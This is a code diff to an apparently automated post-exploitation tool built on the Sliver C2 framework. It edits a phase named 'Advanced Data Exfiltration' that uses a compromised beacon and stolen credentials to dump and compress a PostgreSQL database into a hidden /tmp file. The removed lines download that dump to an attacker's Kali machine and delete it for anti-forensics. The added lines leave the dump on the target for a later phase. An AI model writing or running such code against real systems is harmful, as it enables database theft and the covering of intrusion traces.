@@ -128,60 +128,13 @@ def _discover_db_creds(vinzenz_beacon: str) -> dict | None:
 
 def _dump_compress_and_exfil(vinzenz_beacon: str, creds: dict,
                               results_dir: str) -> bool:
-    """Dump the DB, compress, and exfiltrate via session download.
+    """Dump the DB and compress it locally on the target.
 
     Strategy:
-      1. Upgrade the beacon to an interactive session
-      2. Session task 1: pg_dump | gzip > /tmp/.sys_backup.gz
-      3. Session task 2: sliver download to Kali
+      1. Beacon task: pg_dump | gzip > /tmp/.sys_backup.gz
+      2. Leave the file on the target for the next phase (no exfiltration over C2).
     """
-    local_loot_dir = os.path.join(results_dir, "exfil_loot")
-    os.makedirs(local_loot_dir, exist_ok=True)
-    local_path = os.path.join(local_loot_dir, "sys_backup.gz")
-
-    # ── Step 1: Upgrade to Interactive Session ───────────────────────────────
-    log("[*] Upgrading vinzenz beacon to an interactive session...")
-    open_task_out = sliver_exec(
-        vinzenz_beacon,
-        "interactive",
-        timeout=30
-    )
-    
-    m = re.search(r"\[\*\] Tasked beacon \w+ \((.*?)\)", open_task_out)
-    if not m:
-        log(f"[-] Could not upgrade to interactive session. Output: {open_task_out.strip()}")
-        return False
-    
-    task_id = m.group(1)
-    log(f"[*] OpenSession task {task_id} submitted. Waiting for beacon check-in...")
-    
-    if not _beacon_task_wait(vinzenz_beacon, task_id, max_polls=24, interval=5):
-        log("[-] OpenSession task did not complete in time.")
-        return False
-    
-    # Poll `sessions` to find the new session ID
-    session_id = None
-    log("[*] OpenSession task completed. Polling for the new session ID...")
-    for _ in range(12):
-        time.sleep(5)
-        sessions_out = sliver_exec("", "sessions", timeout=20)
-        # Look for vinzenz.fedora session that is alive
-        for line in sessions_out.splitlines():
-            if "vinzenz.fedora" in line and "[ALIVE]" in line:
-                parts = line.split()
-                if len(parts) > 1:
-                    session_id = parts[0]
-                    break
-        if session_id:
-            break
-            
-    if not session_id:
-        log("[-] Could not locate the new session ID for vinzenz.fedora.")
-        return False
-        
-    log(f"[+] Found interactive session ID: {session_id}")
-
-    # ── Step 2: Dump the database ────────────────────────────────────────────
+    # ── Step 1: Dump the database ────────────────────────────────────────────
     dump_cmd = (
         f"PGPASSWORD='{creds['password']}' "
         f"pg_dump -h {DB_HOST} -p {creds['port']} "
@@ -191,9 +144,9 @@ def _dump_compress_and_exfil(vinzenz_beacon: str, creds: dict,
     log(f"[*] Dumping DB '{creds['dbname']}' from {DB_HOST} "
         f"and compressing to {DUMP_REMOTE_PATH} …")
 
-    # Execute synchronously in the session
+    # Execute synchronously in the beacon
     sliver_exec(
-        session_id,
+        vinzenz_beacon,
         f'execute -o -- sh -c "{dump_cmd}"',
         timeout=120
     )
@@ -202,42 +155,18 @@ def _dump_compress_and_exfil(vinzenz_beacon: str, creds: dict,
     # Brief wait to ensure file is flushed to disk
     time.sleep(3)
 
-    # ── Step 3: Verify dump file exists ──────────────────────────────────────
+    # ── Step 2: Verify dump file exists ──────────────────────────────────────
     verify_result = sliver_exec(
-        session_id,
+        vinzenz_beacon,
         f"execute -o -- ls -la {DUMP_REMOTE_PATH}",
         timeout=30
     )
     if verify_result and DUMP_REMOTE_PATH in verify_result:
-        log(f"[+] Dump file verified on target.")
+        log(f"[+] Dump file verified on target at {DUMP_REMOTE_PATH}.")
+        return True
     else:
-        log(f"[!] Could not verify dump file. Attempting exfil anyway …")
-
-    # ── Step 4: Exfiltrate via download ──────────────────────────────────────
-    log(f"[*] Exfiltrating via session download to {local_path} …")
-    sliver_exec(
-        session_id,
-        f"download {DUMP_REMOTE_PATH} {local_path}",
-        timeout=60
-    )
-    
-    if os.path.exists(local_path):
-        sz = os.path.getsize(local_path)
-        if sz > 0:
-            log(f"[+] Exfiltration successful! "
-                f"File saved to {local_path} ({sz} bytes)")
-            return True
-
-    log("[-] Exfiltration failed — local file not found or empty.")
-    return False
-
-
-def _cleanup(session_id: str):
-    """Remove the dump file from the target (anti-forensics)."""
-    log(f"[*] Anti-Forensics: Cleaning up {DUMP_REMOTE_PATH} from target …")
-    sliver_exec(session_id,
-                f"execute -o -- rm -f {DUMP_REMOTE_PATH}", timeout=10)
-    log("[+] Cleanup complete.")
+        log(f"[-] Could not verify dump file on target.")
+        return False
 
 
 # ---------------------------------------------------------------------------
@@ -260,11 +189,11 @@ def run(root_sliver_session: str, vinzenz_beacon: str, results_dir: str) -> dict
     # Enforce known DB host (dynamic recon will be added later)
     creds["host"] = DB_HOST
 
-    # 2. Dump + compress + exfiltrate (single beacon round-trip) --------------
+    # 2. Dump + compress (leave on target) ------------------------------------
     exfil_ok = _dump_compress_and_exfil(vinzenz_beacon, creds, results_dir)
 
-    # 3. Cleanup --------------------------------------------------------------
-    _cleanup(vinzenz_beacon)  # We can still use the beacon ID for the cleanup execute task, it handles both.
+    # 3. Cleanup skipped ------------------------------------------------------
+    # We leave the file on the target as requested by the user.
 
     if exfil_ok:
         log("[+] Phase 8: Advanced Data Exfiltration completed successfully.")
